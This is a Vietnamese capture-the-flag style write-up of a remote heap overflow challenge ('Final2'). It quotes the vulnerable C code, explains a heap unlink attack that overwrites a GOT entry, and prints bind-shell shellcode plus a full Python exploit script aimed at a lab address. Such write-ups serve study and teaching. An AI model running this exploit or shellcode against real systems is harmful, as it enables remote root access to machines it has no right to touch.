#1-Final2
-  Bài này khai thác lỗ hổng heap từ xa flow
- Có 2 hàm check_path() và get_requests():
```

int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;

  dll = 0;
  while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);     

      dll++;
  }

  for(i = 0; i < dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}
```
- Hàm get_requests nhận tối đa 256 phần tử và bắt đầu bằng từ "FSRD" nếu không có thì chương trình break không có gì đặc biệt nhưng khi đọc vào check_path() thì hàm này bị một lỗ hổng cho phép ta ghi đè một phần bộ nhớ nó sử dụng vì dùng hàm memmove mà không kiểm tra giới hạn của nó.
```
void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
          "yes" : "no", start - buf);
      }
  }
}
```
- Hàm check_path gọi lệnh memmove(start,p,l) có nghĩa là các byte l bắt đầu trên p được sao chép vào start 
- Chương trình sẽ yêu cầu những điều sau: mỗi yêu cầu phải dài 128 byte và bắt đầu bằng "FSRD", check_part sẽ sao chép những gì xuất hiện sau dấu "/" trước khi tới "ROOT"
- Ý tưởng: ghi đè lên header của chunk2 và tạo 1 đoạn mã cho phép ghi đè vào địa chỉ của vùng nhớ, ghi đè vào bảng GOT của một hàm sau lệnh gọi free sau đó đặt shellcode vào vùng nhớ cần kiểm soát 
- Shellcode được liên kết với cổng 4444 và có quyền truy cập root
```
shellcode + = “\ x31 \ xdb \ xf7 \ xe3 \ x53 \ x43 \ x53 \ x6a \ x02 \ x89 \ xe1 \ xb0 \ x66 \ xcd \ x80" \ "\ x5b \ x5e \ x52 \ x68 \ xff \ x02 \ x11 \ x5c \ x6a \ x10 \ x51 \ x50 \ x89 \ xe1 \ x6a "\" \ x66 \ x58 \ xcd \ x80 \ x89 \ x41 \ x04 \ xb3 \ x04 \ xb0 \ x66 \ xcd \ x80 \ x43 \ xb0 "\" \ X66 \ xcd \ x80 \ x93 \ x59 \ x6a \ x3f \ x58 \ xcd \ x80 \ x49 \ x79 \ xf8 \ x68 \ x2f "\" \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x53 \ x89 \ xe1 \ xb0 "\" \ x0b \ xcd \ x80 \ x00 "
```
- Phân tích!
![Screenshot 2022-03-29 010633](https://i.imgur.com/5Iqb4Zi.png)

- Bài này cũng khá liên quan đến heap3  
![Screenshot 2022-03-29 171715](https://i.imgur.com/xHB7lEg.png)
- Bộ nhớ đệm chunk2 : pre_size = -8 vì hàm Chunk_free() sẽ tính toán bằng cách gọi hàm chunk_at_offset(p,-(long)prevsz) để chương trình tin rằng đoạn trước đó bắt đầu bằng độ lệch 8 byte phía trước khi B băt đầu ; size = -4 dùng để đánh lừa phần trước đó đã free và để chương trình hiểu rằng kích thước của phần liền kề là 4byte
- Tiếp đó sẽ là GOT_ADDR-12 vì trường bk đặt cách 12byte so với đầu của mỗi đoạn sau đó chương trình sẽ tới được shellcode_add để thực hiện shell
- Địa chỉ GOT và SHELLCODE_ADDR là
```
GOT_ADDR = "\x10\xd4\x04\x08"
SHELLCODE_ADDR = "\x1c\xe0\x04\x08"
```
- Exploit
```
import socket
import sys

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(("192.168.159.128", 2993))
	PACKET_SIZE = 128
	command = "FSRD"
	GOT_ADDR = "\x10\xd4\x04\x08"
	SHELLCODE_ADDR = "\x1c\xe0\x04\x08"
	shellcode = "\x90" * 24
	shellcode += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
	            "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
	            "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
	            "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
	            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
	            "\x0b\xcd\x80\x00"	

	chunk1 = "FSRD" + "/" + "A" * 8 + shellcode + "A"*(PACKET_SIZE - 4 - 1 - 8 - 4  - 1 - len(shellcode)) + "ROOT/"
	payload = "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff" + GOT_ADDR + SHELLCODE_ADDR
	chunk2 = "FSRD" + "ROOT" + "/" + payload + "C"*(PACKET_SIZE - 4 - len(payload) - 4 - 1)
	packet = command + "/" + "ROOT" + "A" * (PACKET_SIZE - 4 - 1 - 4)

	sock.send(chunk1 + chunk2 + packet + "\n")
	print(sock.recv(1024))
	sock.close()

if __name__ == "__main__":
	main()
```
- Kết quả
![Screenshot 2022-03-29 173310](https://i.imgur.com/EA2oYlQ.png)![Screenshot 2022-03-29 173344](https://i.imgur.com/nHJmckE.png)
